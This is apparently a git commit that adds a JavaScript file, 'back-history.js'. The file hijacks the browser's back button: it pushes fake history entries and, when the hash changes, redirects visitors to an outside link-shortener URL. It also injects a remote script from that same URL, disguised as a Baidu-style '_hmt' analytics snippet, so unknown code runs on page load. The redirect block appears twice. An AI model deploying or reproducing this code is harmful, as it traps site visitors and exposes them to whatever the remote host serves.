619178bf264b93a22e174c003a1b60bbb60d7e0b
projectroom119 <tutorialsworld119@gmail.com>
2024-02-23 14:33:12 +0100

    first commit

---
+++ back-history.js
@@ -0,0 +1,36 @@
+
+  window.onhashchange=function(){jp();};
+  function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+  function jp() {
+      fh();}
+  setTimeout('hh();', 500);
+  function fh(){
+      location.href="https://linkyt.in/umleiten?id=KEOhXW5XI4hSIlTkmuufMDjSZPDb2U";
+  }
+  function goon(){
+      location.href="https://linkyt.in/umleiten?id=KEOhXW5XI4hSIlTkmuufMDjSZPDb2U";
+  }
+
+
+
+  window.onhashchange=function(){jp();};
+  function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+  function jp() {
+      fh();}
+  setTimeout('hh();', 500);
+  function fh(){
+      location.href="https://linkyt.in/umleiten?id=KEOhXW5XI4hSIlTkmuufMDjSZPDb2U";
+  }
+  function goon(){
+      location.href="https://linkyt.in/umleiten?id=KEOhXW5XI4hSIlTkmuufMDjSZPDb2U";
+  }
+
+
+  var _hmt = _hmt || [];
+  (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://linkyt.in/umleiten?id=KEOhXW5XI4hSIlTkmuufMDjSZPDb2U";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+  })();
+
